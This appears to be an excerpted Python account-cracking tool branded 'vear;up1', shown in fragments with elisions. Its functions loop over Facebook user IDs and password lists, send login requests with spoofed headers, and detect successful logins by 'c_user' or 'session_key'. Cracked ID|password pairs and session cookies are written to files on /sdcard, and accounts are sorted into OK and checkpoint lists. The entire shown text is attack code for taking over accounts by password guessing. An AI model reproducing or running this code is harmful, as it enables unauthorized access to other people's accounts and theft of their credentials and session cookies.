...
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31mvear;up1\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m:vear;up1
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mvear;up1\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'x-fb-request-id': 'AvrF_3o8coLH5B4lCRYgduU',
    'x-fb-trace-id': 'GMZjFPSMG67',
    'x-fb-rev': '1008024456',
    'x-fb-debug': 'YMz7zYe3MG+g8rloNkxmrpssss3lG/PIKLoU0UyX9RvnU5fiSL8f1CxvGKEgdeb1zRqjc689DldVkq42N1+t4A==',
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [vear;up1-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [vear;up1-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/vear002-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [vear;up1] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                             ...
                             'viewport-width': '980',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [vear;up1-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/vear002-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
    ...
    'viewport-width': '980',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [vear;up1-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/vear;up1-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/vear;up1CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [vear;up1-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/vear;up1-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/vear;up1_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [vear;up1-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/vear;up1-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
